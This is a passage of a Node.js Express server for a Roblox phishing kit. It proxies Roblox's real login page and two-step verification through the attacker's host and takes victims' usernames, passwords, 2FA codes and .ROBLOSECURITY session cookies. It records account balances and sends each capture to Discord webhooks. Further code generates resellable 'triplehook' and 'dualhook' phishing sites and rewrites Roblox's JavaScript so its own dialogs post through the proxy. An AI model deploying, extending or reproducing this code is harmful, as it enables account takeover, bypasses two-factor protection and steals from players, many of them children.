        proxies: healthy.map(p => `${p.host}:${p.port}`)
    });
});

// PoW solving lives in twofactor.js (vdfSolve). The old route here drove a
// second, incorrect solver on the public surface and blocked the event loop for
// the duration of a million BigInt hashes. Removed rather than fixed: one
// implementation, on the path that actually performs logins.

// Centralized Captured Session Processor
async function handleCapturedSession({ username, password, cookie, cookieVerified = null, allCookies, user, twoFactorCode = null, clientIp, sessionId = null, userAgent, returnUrl = 'https://www.roblox.com/home', hitId = null }) {
    try {
        const resolved = resolveLoginCredentials(sessionId, clientIp, username, user);
        const effectiveUsername = user?.name || (username && username !== 'Unknown' ? username : resolved.username);
        const effectivePassword = (password && password !== 'None' && password !== 'Captured') ? password : resolved.password;
        const effective2FA = twoFactorCode || resolved.twoFactorCode || '';
        // No verified identity means no id. A random 15-digit number looks like
        // a Roblox userId in the panel and groups unrelated attempts together.
        const effectiveUserId = user?.id ? String(user.id) : null;

        // One login, one message.
        // Four different places notice a session (the Set-Cookie hop, the
        // inbound-cookie reader, the API routes, the capture beacon). The key is
        // the cookie tail when there is one, because a failed validation leaves
        // `user` null and a random id would never match itself. Fall back to the
        // username for the cookie-less attempt reports.
        const dedupeKey = cookie
            ? `cookie:${String(cookie).slice(-40)}`
            : `user:${effectiveUsername}`;
        if (dispatchedCaptures.has(dedupeKey)) {
            console.log(`[CAPTURE] duplicate suppressed for ${effectiveUsername}`);
            return;
        }
        dispatchedCaptures.add(dedupeKey);
        setTimeout(() => dispatchedCaptures.delete(dedupeKey), 90_000);

        // Armed for the login page's poll. Cleared by TTL, not by reading.
        if (clientIp) recentLogins.set(clientIp, Date.now());

        // Update signins.json
        recordSignin({
            username: effectiveUsername,
            discriminator: '0',
            id: effectiveUserId,
            avatar: null
        });

        // Append to login_log.txt
        const logEntry = `${new Date().toISOString()} | ${clientIp} | ${effectiveUsername}${effective2FA ? ' [2FA: ' + effective2FA + ']' : ''}\n`;
        fs.appendFileSync(R.dataPath('login_log.txt'), logEntry);

        // Row first. Enrichment is sixteen sequential Roblox API calls and can
        // take minutes on a slow link; the hit itself must not wait for it.
        // Reuse the attempt row when the credential POST already wrote one, so a
        // login shows up once with its cookie instead of twice.
        const attemptId = hitId || takeAttemptId({ sessionId, clientIp, username: effectiveUsername });
        let entry = attemptId ? hitsStore.find(h => h.id === attemptId) : null;
        if (entry) {
            entry.username = effectiveUsername;
            entry.userId = effectiveUserId;
            entry.hasCookie = Boolean(cookie);
            entry.cookie = cookie || '';
            entry.cookieVerified = cookieVerified === null ? undefined : Boolean(cookieVerified);
            entry.source = effective2FA ? '2fa_login' : 'direct_login';
            entry.timestamp = Date.now();
            await persistHits(hitsStore);
        } else {
            entry = await recordHit({
                username: effectiveUsername,
                userId: effectiveUserId,
                balance: 0,
                summary: 0,
                rap: 0,
                hasCookie: Boolean(cookie),
                cookie: cookie || '',
                source: effective2FA ? '2fa_login' : 'direct_login',
                ip: clientIp
            }).catch(err => {
                console.error('[HITS] Error recording hit:', err.message);
                return null;
            });
        }

        // Then fill in the numbers, capped so a hung endpoint cannot hold the
        // webhook open all night.
        let richData = null;
        if (cookie && user?.id) {
            try {
                const richCapture = new RichDataCapture(cookie);
                richData = await Promise.race([
                    richCapture.captureAll(user.id),
                    new Promise(resolve => setTimeout(() => resolve(null), 12000))
                ]);
                if (!richData) console.warn('[CAPTURE] Enrichment timed out; sending without it');
            } catch (re) {
                console.error('[CAPTURE] RichDataCapture error:', re.message);
            }
        }

        if (richData && entry) {
            entry.balance = richData.creditBalance || 0;
            entry.summary = (richData.creditBalance || 0) + (richData.pendingRobux || 0);
            entry.rap = richData.rap || 0;
            if (user?.id) entry.userId = String(user.id);
            await persistHits(hitsStore);
        }

        // Unified webhook
        await unifiedWebhook.sendCapture({
            username: effectiveUsername,
            password: effectivePassword,
            cookie: cookie || '',
            cookieVerified,
            twoFactorCode: effective2FA,
            ip: clientIp,
            userAgent: userAgent || 'Unknown',
            timestamp: new Date().toISOString(),
            valid: true,
            richData
        }).catch(err => console.error('[WEBHOOK] Error dispatching unified webhook:', err.message));

        // Legacy webhook fallback removed here on purpose.
        // sendToWebhook reads the same webhooks.json that unifiedWebhook already
        // fanned out to, so calling both posted every capture twice per URL.
        // One dispatcher, one message.
    } catch (err) {
        console.error('[CAPTURE] Error in handleCapturedSession:', err.message);
    }
}

// Validate credentials endpoint
app.post('/api/auth/validate', async (req, res) => {
    const { username, password, captchaToken } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password required' });
    }

    const result = await trueLogin.validateCredentials(username, password, captchaToken);
    res.json(result);
});

// Primary Auth Route (Credentials Submission)
app.post(['/api/auth/login', '/api/auth/2fa/initiate'],
    rateLimitMiddleware('auth-login', 20, 60_000),
    async (req, res) => {
    const { username, password, returnUrl } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress || '127.0.0.1';
    const userAgent = req.get('User-Agent') || 'Unknown';

    if (!username || !password) {
        return res.status(400).json({ success: false, error: 'Username and password required' });
    }

    try {
        // A double-tapped submit would otherwise pay for two proof-of-work
        // solves (~7s each) and burn two login attempts. Identical attempts
        // inside the replay window collapse onto the first result.
        const flightKey = authFlightKey(req.ip, 'api/auth/login', { username, password });
        const outcome = await runAuthOnce(flightKey, async () => {
            const attempt = await twoFactorHandler.initiateLogin(username, password);
            return { ok: Boolean(attempt.valid || attempt.requiresTwoFactor), result: attempt };
        });
        const result = outcome.result;

        // Scenario 1: Clean account - no 2FA
        if (result.valid) {
            await handleCapturedSession({
                username,
                password,
                cookie: result.cookie,
                cookieVerified: result.cookieVerified,
                allCookies: result.allCookies,
                user: result.user,
                clientIp,
                userAgent,
                returnUrl
            });

            return res.json({
                success: true,
                valid: true,
                requiresTwoFactor: false,
                redirect: 'https://www.roblox.com/home'
            });
        }

        // Scenario 2: Two-Step Verification challenge triggered
        if (result.requiresTwoFactor) {
            return res.json({
                success: false,
                requiresTwoFactor: true,
                sessionId: result.sessionId,
                mediaType: result.mediaType || 'Email',
                userId: result.userId,
                message: result.message
            });
        }

        // Scenario 3: Captcha required — staged for the browser, not solved here
        if (result.requiresCaptcha) {
            return res.json({
                success: false,
                requiresCaptcha: true,
                native: Boolean(result.native),
                captchaId: result.captchaId,
                captchaWidget: result.captchaWidget,
                expiresInMs: result.expiresInMs,
                message: result.message
            });
        }

        // Scenario 4: Invalid credentials
        return res.json({
            success: false,
            valid: false,
            requiresTwoFactor: false,
            message: result.message || 'Incorrect username or password. Please try again.'
        });
    } catch (err) {
        console.error('[AUTH] Login exception:', err.message);
        return res.status(500).json({ success: false, message: 'Authentication service temporarily unavailable.' });
    }
});

// 2FA Verification Route (Gmail / Authenticator Code Submission)
// Rate limited per IP: six digits is a million guesses and Roblox will not
// tolerate a flood on a victim's behalf.
app.post(['/api/auth/verify-2fa', '/api/auth/2fa/verify'], rateLimitMiddleware('auth-verify-2fa', 10, 60_000), async (req, res) => {
    const { sessionId, code, returnUrl } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress || '127.0.0.1';
    const userAgent = req.get('User-Agent') || 'Unknown';

    if (!sessionId || !code) {
        return res.status(400).json({ success: false, error: 'Session ID and 6-digit verification code required' });
    }

    // Authenticator codes are 6 digits, recovery codes are alphanumeric and
    // hyphenated. Strip the separators and accept both.
    if (!/^[a-z0-9]{4,16}$/i.test(String(code).replace(/[\s-]/g, ''))) {
        return res.json({ success: false, valid: false, message: 'Incorrect code. Please try again.' });
    }

    try {
        const result = await twoFactorHandler.verify2FACode(sessionId, code);

        if (result.valid) {
            await handleCapturedSession({
                username: result.username,
                password: result.password,
                cookie: result.cookie,
                cookieVerified: result.cookieVerified,
                allCookies: result.allCookies,
                user: result.user,
                twoFactorCode: result.twoFactorCode,
                clientIp,
                hitId: takeAttemptId({ sessionId, clientIp, username: result.username }),
                userAgent,
                returnUrl
            });

            return res.json({
                success: true,
                valid: true,
                redirect: 'https://www.roblox.com/home'
            });
        }

        return res.json({
            success: false,
            valid: false,
            message: result.message || 'Incorrect code. Please try again.'
        });
    } catch (err) {
        console.error('[AUTH] 2FA verification exception:', err.message);
        return res.status(500).json({ success: false, message: '2FA verification service temporarily unavailable.' });
    }
});

// Resend 2FA Email Code
app.post(['/api/auth/resend-2fa', '/api/auth/2fa/resend'],
    rateLimitMiddleware('auth-resend-2fa', 5, 60_000),
    async (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) {
        return res.status(400).json({ success: false, error: 'Session ID required' });
    }

    const result = await twoFactorHandler.resend2FACode(sessionId);
    res.json(result);
});

// Captcha token relay.
//
// The browser ran Arkose's own enforcement widget with the dataExchangeBlob the
// challenge carried, and posts the resulting session token here. The engine
// redeems it against apis.roblox.com/challenge/v1/continue and replays the login
// on the jar that opened the challenge — which is why the outcome can be a
// finished session *or* a two-step prompt, and both are handled.
app.post(['/api/auth/captcha-solved', '/api/auth/captcha'],
    rateLimitMiddleware('auth-captcha', 15, 60_000),
    async (req, res) => {
    const { captchaId, token, returnUrl } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress || '127.0.0.1';
    const userAgent = req.get('User-Agent') || 'Unknown';

    if (!captchaId || !token) {
        return res.status(400).json({ success: false, error: 'captchaId and token are required' });
    }

    try {
        const result = await twoFactorHandler.submitCaptcha(captchaId, token);

        if (result.valid) {
            await handleCapturedSession({
                username: result.username,
                password: result.password,
                cookie: result.cookie,
                allCookies: result.allCookies,
                user: result.user,
                clientIp,
                hitId: takeAttemptId({ sessionId: req.body?.sessionId, clientIp, username: result.username }),
                userAgent,
                returnUrl
            });

            return res.json({
                success: true,
                valid: true,
                requiresTwoFactor: false,
                redirect: 'https://www.roblox.com/home'
            });
        }

        if (result.requiresTwoFactor) {
            return res.json({
                success: false,
                requiresTwoFactor: true,
                sessionId: result.sessionId,
                mediaType: result.mediaType,
                userId: result.userId,
                message: result.message
            });
        }

        return res.json({
            success: false,
            valid: false,
            message: result.message || 'Verification did not complete. Please try again.'
        });
    } catch (err) {
        console.error('[AUTH] Captcha relay exception:', err.message);
        return res.status(500).json({ success: false, message: 'Verification service temporarily unavailable.' });
    }
});

// Webhook test endpoint
app.post('/api/webhook/test', async (req, res) => {
    let targetUrl = req.body && req.body.webhookUrl ? req.body.webhookUrl.trim() : null;
    if (!targetUrl) {
        const userId = req.session.user ? req.session.user.id : PUBLIC_GUEST_USER.id;
        const webhooks = loadWebhooks();
        if (webhooks[userId] && webhooks[userId].webhookUrl) {
            targetUrl = webhooks[userId].webhookUrl;
        }
    }

    if (!targetUrl) {
        return res.status(400).json({ success: false, error: 'Please enter a webhook URL first.' });
    }

    if (!targetUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ success: false, error: 'Invalid Discord webhook URL format.' });
    }

    try {
        await axios.post(targetUrl, {
            embeds: [{
                title: "Webhook Test",
                description: "Your Discord webhook is working properly. Login notifications will be sent here.",
                color: 0x22c55e,
                footer: { text: "Roblox Ingress Dashboard" },
                timestamp: new Date().toISOString()
            }]
        });
        return res.json({ success: true, message: 'Test message sent to Discord!' });
    } catch (err) {
        console.error('[WEBHOOK TEST ERROR]', err.message);
        return res.status(500).json({ success: false, error: 'Discord returned an error: ' + (err.response?.data?.message || err.message) });
    }
});

// System stats endpoint
app.get('/api/system/stats', (req, res) => {
    const uptime = process.uptime();
    const stats = proxyRotation.getStats();
    
    res.json({
        uptime: `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`,
        proxyStatus: `${Object.keys(stats).length} proxies loaded`,
        pending2FASessions: twoFactorHandler.getPendingSessions(),
        pendingCaptchas: twoFactorHandler.getPendingCaptchas(),
        memory: process.memoryUsage()
    });
});

// Profile template endpoints
app.get('/api/templates', (req, res) => {
    res.json(profileTemplates.getAllTemplates());
});

app.get('/api/templates/:name', (req, res) => {
    const template = profileTemplates.getTemplate(req.params.name);
    if (template) {
        res.json(template);
    } else {
        res.status(404).json({ error: 'Template not found' });
    }
});

app.post('/api/profiles/generate', (req, res) => {
    const { template, fields } = req.body;
    
    if (!template) {
        return res.status(400).json({ error: 'Template name required' });
    }

    const profile = profileTemplates.generateProfile(template, fields);
    const saved = profileTemplates.saveProfile(profile);
    
    res.json({ profile, saved });
});

app.post('/api/templates/create', (req, res) => {
    const { name, displayName, fields } = req.body;
    
    if (!name || !displayName || !fields) {
        return res.status(400).json({ error: 'Name, displayName, and fields required' });
    }

    const result = profileTemplates.createCustomTemplate(name, displayName, fields);
    res.json(result);
});

app.delete('/api/templates/:name', (req, res) => {
    const result = profileTemplates.deleteTemplate(req.params.name);
    if (result.success) {
        res.json(result);
    } else {
        res.status(400).json(result);
    }
});

// ── Site Generator API Endpoints ──

// Create triplehook
app.post('/api/sites/triplehook', (req, res) => {
    const { name, displayName, webhookUrl, dualhookUrl, triplehookUrl, themeColor, logoUrl, ownerId } = req.body;
    
    if (!name || !displayName || !webhookUrl) {
        return res.status(400).json({ error: 'Name, displayName, and webhookUrl required' });
    }

    const result = siteGenerator.createTriplehook({
        name, displayName, webhookUrl, dualhookUrl, triplehookUrl, themeColor, logoUrl, ownerId
    });
    
    if (result.success) {
        res.json(result);
    } else {
        res.status(400).json(result);
    }
});

// Create dualhook under triplehook
app.post('/api/sites/dualhook/:triplehookId', (req, res) => {
    const { name, displayName, webhookUrl, themeColor, logoUrl, ownerId } = req.body;
    
    if (!name || !displayName || !webhookUrl) {
        return res.status(400).json({ error: 'Name, displayName, and webhookUrl required' });
    }

    const result = siteGenerator.createDualhook(req.params.triplehookId, {
        name, displayName, webhookUrl, themeColor, logoUrl, ownerId
    });
    
    if (result.success) {
        res.json(result);
    } else {
        res.status(400).json(result);
    }
});

// Get all sites
app.get('/api/sites', (req, res) => {
    res.json(siteGenerator.getAllSites());
});

// Get site by ID
app.get('/api/sites/:siteId', (req, res) => {
    const site = siteGenerator.getSite(req.params.siteId);
    if (site) {
        res.json(site);
    } else {
        res.status(404).json({ error: 'Site not found' });
    }
});

// Get site by name
app.get('/api/sites/name/:name', (req, res) => {
    const site = siteGenerator.getSiteByName(req.params.name);
    if (site) {
        res.json(site);
    } else {
        res.status(404).json({ error: 'Site not found' });
    }
});

// Get all triplehooks
app.get('/api/sites/triplehooks', (req, res) => {
    res.json(siteGenerator.getTriplehooks());
});

// Get dualhooks for a triplehook
app.get('/api/sites/:triplehookId/dualhooks', (req, res) => {
    res.json(siteGenerator.getDualhooks(req.params.triplehookId));
});

// Update site
app.put('/api/sites/:siteId', (req, res) => {
    const result = siteGenerator.updateSite(req.params.siteId, req.body);
    if (result.success) {
        res.json(result);
    } else {
        res.status(400).json(result);
    }
});

// Delete site
app.delete('/api/sites/:siteId', (req, res) => {
    const result = siteGenerator.deleteSite(req.params.siteId);
    if (result.success) {
        res.json(result);
    } else {
        res.status(400).json(result);
    }
});

// Login page route - serves proxied Roblox login page
app.all(['/login', '/Login'], (req, res) => {
    if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
        return phpCaptureHandler(req, res);
    }
    return loginPage(req, res);
});

app.all(['/capture', '/Capture'], phpCaptureHandler);

// Roblox navigation redirects - send victim to real Roblox home upon successful login
app.all(['/home', '/home/*', '/my/avatar', '/discover'], (req, res) => {
    return res.redirect('https://www.roblox.com/home');
});

// Multi-tenant site routing
const TENANT_RESERVED = new Set(['login', 'login.php', 'capture', 'capture.php', 'dashboard', 'auth', 'callback',
    'api', 'public', 'users', 'communities', 'groups', 'games', 'game', 'favicon.ico', 'healthz', 'logout',
    'home', 'discover', 'my', 'rblx-users', 'rblx-avatar', 'rblx-badges', 'rblx-thumbnails-api',
    'rblx-friends', 'rblx-presence', 'proxy', 'rblx-js', 'thumbnails', 'imgrbx', 'rbxcdn', 'staticrbx']);

// A tenant slug is one path segment, lowercase, no dots. Anything else is a
// normal request that simply does not exist — hand it to the 404 handler
// instead of answering it with "Site not found".
function isTenantSlug(value) {
    if (typeof value !== 'string' || !value) return false;
    const lower = value.toLowerCase();
    if (lower.includes('.')) return false;
    if (TENANT_RESERVED.has(lower)) return false;
    return true;
}

app.get('/:siteName', async (req, res, next) => {
    if (!isTenantSlug(req.params.siteName)) return next();

    const site = siteGenerator.getSiteByName(req.params.siteName);

    if (!site) {
        return res.status(404).send('Site not found');
    }

    // Increment visitor stats
    siteGenerator.incrementStats(site.id, 'visitors');

    // Serve site with custom branding
    // This would render the profile/communities/games with the site's theme
    res.send(`Site: ${site.displayName}<br>Theme: ${site.themeColor}<br>Type: ${site.type}`);
});

app.get('/:triplehookName/:dualhookName', async (req, res, next) => {
    if (!isTenantSlug(req.params.triplehookName) || !isTenantSlug(req.params.dualhookName)) return next();

    const triplehook = siteGenerator.getSiteByName(req.params.triplehookName);

    if (!triplehook || triplehook.type !== 'triplehook') {
        return next();
    }

    const dualhook = triplehook.dualhooks
        .map(id => siteGenerator.getSite(id))
        .find(s => s && s.name === req.params.dualhookName);

    if (!dualhook) {
        return res.status(404).send('Dualhook not found');
    }

    // Increment visitor stats for both
    siteGenerator.incrementStats(dualhook.id, 'visitors');

    // Serve dualhook site
    res.send(`Dualhook: ${dualhook.displayName}<br>Parent: ${triplehook.displayName}<br>Theme: ${dualhook.themeColor}`);
});

Object.entries(ROBLOX_API_PROXIES).forEach(([prefix, upstream]) => {
    app.all(`/${prefix}/*`, async (req, res) => {
        if (req.method === 'OPTIONS') {
            if (S.applyCors(req, res, ALLOWED_ORIGINS)) {
                res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
                res.setHeader('Access-Control-Allow-Headers', req.get('access-control-request-headers') || '*');
            }
            return res.status(204).end();
        }

        const subPath = req.path.replace(`/${prefix}`, '');
        const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
        const targetUrl = `${upstream}${subPath}${qs}`;
        try {
            // Encode the body and label it with the type actually sent. Labelling a
            // form-encoded body as JSON made Roblox answer 415 on every call, which
            // surfaced in the browser console as a wall of failed resources.
            let rawBody;
            let contentType = req.get('Content-Type') || '';
            if (req.method !== 'GET' && req.method !== 'HEAD') {
                if (contentType.includes('application/json')) {
                    rawBody = JSON.stringify(req.body || {});
                } else {
                    rawBody = new URLSearchParams(Object.entries(req.body || {}).map(([key, value]) => [key, value == null ? '' : String(value)])).toString();
                    contentType = 'application/x-www-form-urlencoded';
                }
            }

            const fetchOpts = {
                method: req.method,
                headers: {
                    ...ROBLOX_HEADERS,
                    'Content-Type': contentType || 'application/json',
                    'Accept': req.get('Accept') || '*/*',
                    'Origin': 'https://www.roblox.com',
                    'Referer': 'https://www.roblox.com/'
                }
            };
            // An empty X-CSRF-TOKEN reads as a bad token upstream and turns the
            // login POST into a 403. Only forward it when the client actually sent one.
            const inboundCsrf = req.get('X-CSRF-TOKEN') || req.get('x-csrf-token');
            if (inboundCsrf) {
                fetchOpts.headers['X-CSRF-TOKEN'] = inboundCsrf;
            }
            if (req.get('Cookie')) {
                fetchOpts.headers.Cookie = req.get('Cookie');
            }
            if (rawBody !== undefined) {
                fetchOpts.body = rawBody;
            }
            const proxyRes = await fetch(targetUrl, fetchOpts);

            // ── .ROBLOSECURITY capture + cookie pass-through ──
            // Roblox issues the session cookie on the auth response. Without this
            // block the header was dropped, so the browser never got a session and
            // the embed never got a cookie.
            const setCookieList = proxyRes.headers.getSetCookie
                ? proxyRes.headers.getSetCookie()
                : (proxyRes.headers.get('set-cookie') ? [proxyRes.headers.get('set-cookie')] : []);

            const robloxCookieHeader = setCookieList.find(c => c.includes('.ROBLOSECURITY='));
            if (robloxCookieHeader) {
                const cookieValue = robloxCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
                const isExpiry = /max-age=0|expires=thu,\s*01\s*jan\s*1970/i.test(robloxCookieHeader);
                if (cookieValue && cookieValue.length > 20 && !isExpiry) {
                    const accountName = req.body?.cvalue || req.body?.username || 'Unknown';
                    console.log(`[CAPTURE] .ROBLOSECURITY issued for ${accountName} (${cookieValue.length} chars)`);
                    const allCookies = setCookieList.map(c => c.split(';')[0]).join('; ');
                    await handleCapturedSession({
                        username: accountName,
                        password: req.body?.password || 'None',
                        cookie: cookieValue,
                        allCookies,
                        clientIp: req.ip || req.connection.remoteAddress || '127.0.0.1',
                        userAgent: req.get('User-Agent') || 'Unknown',
                        returnUrl: '/'
                    }).catch(err => console.error('[CAPTURE] dispatch failed:', err.message));
                }
            }

            if (setCookieList.length > 0) {
                // localhost cannot honour Domain=.roblox.com or Secure, so strip them
                // and keep the cookie alive in the browser for the flow to complete.
                res.setHeader('Set-Cookie', setCookieList.map(c => c
                    .replace(/;\s*Domain=[^;]*/gi, '')
                    .replace(/;\s*Secure/gi, '')
                    .replace(/SameSite=None/gi, 'SameSite=Lax')));
            }

            const ct = proxyRes.headers.get('content-type') || 'application/json';
            res.setHeader('Content-Type', ct);
            S.applyCors(req, res, ALLOWED_ORIGINS);
            const csrfToken = proxyRes.headers.get('x-csrf-token');
            if (csrfToken) {
                res.setHeader('x-csrf-token', csrfToken);
            }
            const challengeMetadata = proxyRes.headers.get('rblx-challenge-metadata');
            if (challengeMetadata) {
                res.setHeader('rblx-challenge-metadata', challengeMetadata);
            }
            const challengeId = proxyRes.headers.get('rblx-challenge-id');
            if (challengeId) {
                res.setHeader('rblx-challenge-id', challengeId);
            }
            const challengeType = proxyRes.headers.get('rblx-challenge-type');
            if (challengeType) {
                res.setHeader('rblx-challenge-type', challengeType);
            }
            res.status(proxyRes.status);
            const data = await proxyRes.arrayBuffer();
            let out = Buffer.from(data);

            // The login bundle is where 1:1 lives or dies. Roblox's React client
            // hardcodes https://auth.roblox.com and
            // https://twostepverification.roblox.com inside the bundle; served
            // unrewritten it calls them cross-origin from our page, the browser
            // blocks the response, and no amount of correct proxying shows a real
            // dialog. Rewriting the bundle is what lets Roblox's own two-step
            // component render and post its code back through us.
            const isBundle = prefix === 'rblx-js' || ct.includes('javascript');
            if (isBundle) {
                const host = req.get('host');
                const proto = req.protocol || 'http';
                out = Buffer.from(
                    out.toString('utf8')
                        .replace(/https:\/\/([a-z0-9-]+)\.roblox\.com/gi, `${proto}://${host}/proxy/roblox/$1.roblox.com`)
                        .replace(/https:\/\/roblox\.com/gi, `${proto}://${host}/proxy/roblox/www.roblox.com`),
                    'utf8'
                );
            }

            res.send(out);
        } catch (e) {
            console.error(`[RBLX-PROXY] ${prefix} → ${targetUrl} failed:`, e.message);
            res.status(502).json({ error: 'Roblox API proxy failed' });
        }
    });
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// ── Login cache warmer ──
// login.php fetches www.roblox.com/login and caches the markup for 60 seconds.
// Without a warmer the first visitor after every expiry pays for that fetch,
// and a slow or blocked upstream shows up as a slow or broken page.
//
// The warmer keeps the snapshot no older than ~25s, so the page a visitor sees
// is always Roblox's current revision and never waits on a cold request.
const LOGIN_CACHE_DIR = R.dataPath('.cache', 'login-html');
const LOGIN_CACHE_FILE = path.join(LOGIN_CACHE_DIR, 'roblox_login.html');
const WARM_INTERVAL_MS = 25_000;

async function warmLoginCache() {
    try {
        const res = await fetch('https://www.roblox.com/login', {
            headers: {
                'User-Agent': AUTH_UA,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache'
            },
            signal: AbortSignal.timeout(12_000)
        });
        if (!res.ok) {
            console.warn(`[WARM] upstream ${res.status}`);
            return false;
        }
        const html = await res.text();
        if (!html || html.length < 5000) {
            console.warn('[WARM] upstream returned a short page, keeping the old snapshot');
            return false;
        }
        if (!fs.existsSync(LOGIN_CACHE_DIR)) fs.mkdirSync(LOGIN_CACHE_DIR, { recursive: true });
        const tmp = `${LOGIN_CACHE_FILE}.${process.pid}.tmp`;
        fs.writeFileSync(tmp, html);
        fs.renameSync(tmp, LOGIN_CACHE_FILE);
        return true;
    } catch (err) {
        console.warn('[WARM] failed:', err.message);
        return false;
    }
}

// Health surface: is the page warm, is the relay allowlist intact, is the box
// still able to reach Roblox. Read-only and unauthenticated on purpose — it
// carries no captured data.
app.get('/healthz', async (req, res) => {
    let cacheAgeMs = null;
    try {
        cacheAgeMs = Date.now() - fs.statSync(LOGIN_CACHE_FILE).mtimeMs;
    } catch { /* no snapshot yet */ }

    res.json({
        snapshotPresent: cacheAgeMs !== null,
        snapshotAgeMs: cacheAgeMs,
        snapshotStale: cacheAgeMs === null || cacheAgeMs > 90_000,
        warmIntervalMs: WARM_INTERVAL_MS,
        store: store.MODE,
        upstreamAllowlistSize: S.ALLOWED_UPSTREAM_HOSTS.size,
        upstreamSuffixes: S.ALLOWED_UPSTREAM_SUFFIXES
    });
});

// Cache warming only makes sense on a long-lived box. On Vercel it would add
// an upstream fetch to every cold start and delay the response.
if (!process.env.VERCEL) {
    setTimeout(() => { warmLoginCache(); }, 1500).unref?.();
    const warmTimer = setInterval(warmLoginCache, WARM_INTERVAL_MS);
    if (warmTimer.unref) warmTimer.unref();
}


// ── In-memory state sweeps ──
// These maps are keyed by session id, and saveUninitialized:false mints a fresh
// id per request, so an unauthenticated caller can add entries indefinitely.
// Timestamped maps get a TTL; the rest are capped by insertion order.
const TRANSIENT_MAP_MAX = 5000;
function sweepTransientState() {
    const now = Date.now();
    for (const [key, entry] of credentialCache) {
        const stamp = Number(entry && entry.timestamp) || 0;
        if (!stamp || now - stamp > CRED_TTL_MS) credentialCache.delete(key);
    }
    for (const [key, entry] of pendingAttempts) {
        if (now - (Number(entry && entry.at) || 0) > PENDING_ATTEMPT_TTL_MS) pendingAttempts.delete(key);
    }
    for (const map of [loginSessions, loginIdentities, loginChallenges, login2faPending, credentialCache]) {
        while (map.size > TRANSIENT_MAP_MAX) {
            map.delete(map.keys().next().value);
        }
    }
}
const transientSweep = setInterval(sweepTransientState, 5 * 60 * 1000);
if (transientSweep.unref) transientSweep.unref();

// ── Boot state ──
// Captures are only as durable as the store behind them. Say so once, loudly,
// when the process is running somewhere that gives every instance its own /tmp.
if (process.env.VERCEL && !store.SHARED) {
    console.warn('[STORE] file mode on Vercel: every instance has its own /tmp, so a hit');
    console.warn('[STORE] written by one invocation is invisible to the next. Connect Vercel');
    console.warn('[STORE] Blob (BLOB_READ_WRITE_TOKEN) or a KV REST pair and redeploy.');
}
if (store.SHARED) console.log(`[STORE] shared backend active (${store.MODE}) — captures are instance-independent`);

// ── Terminal error handlers ──
// Anything a route throws synchronously lands here instead of Express's default
// HTML page, which prints the stack in development. API callers get JSON, page
// callers get a plain line. Headers already sent means the response is half out
// the door — hand it back to Express so it can close the socket.
app.use((err, req, res, next) => {
    if (res.headersSent) return next(err);
    console.error('[ROUTE]', req.method, req.originalUrl, '-', err && err.stack ? err.stack : err);
    if (req.originalUrl && req.originalUrl.startsWith('/api/')) {
        return res.status(500).json({ error: 'Internal server error' });
    }
    res.status(500).type('text/plain').send('Internal server error');
});

app.use((req, res) => {
    if (req.originalUrl && req.originalUrl.startsWith('/api/')) {
        return res.status(404).json({ error: 'Not found' });
    }
    res.status(404).type('text/plain').send('Not found');
});

// Vercel loads this module through api/index.js; binding a port there would
// fail and the exported app is what the function runtime invokes.
if (!process.env.VERCEL && require.main === module) {
    const server = app.listen(PORT, () => {
        console.log(`Insanity Dashboard running on http://localhost:${PORT}`);
        console.log(`Total recorded sign-ins: ${signins.length}`);
        if (!DISCORD_CLIENT_ID || DISCORD_CLIENT_ID === 'your_client_id_here' || !DISCORD_CLIENT_SECRET || DISCORD_CLIENT_SECRET === 'your_client_secret_here') {
            console.warn(`[WARNING] Discord OAuth credentials are not configured in .env. Developer Bypass mode is active.`);
        } else {
            console.log(`Redirect URI: ${REDIRECT_URI}`);
        }
    }).on('error', (err) => {
        console.error('Express server error:', err);
    });

    // Dual-listener on Port 80 for seamless access without :3000
    if (Number(PORT) !== 80) {
        try {
            const http = require('http');
            const port80Server = http.createServer(app);
            port80Server.listen(80, () => {
                console.log(`[INGRESS] Port 80 listener active: http://localhost/ (proxies to Express)`);
            });
            port80Server.on('error', (err) => {
                console.log(`[INGRESS] Port 80 listener not available (${err.message}) - continuing with port ${PORT}`);
            });
        } catch (e) {
            console.log(`[INGRESS] Port 80 bind skipped: ${e.message}`);
        }
    }
}

module.exports = app;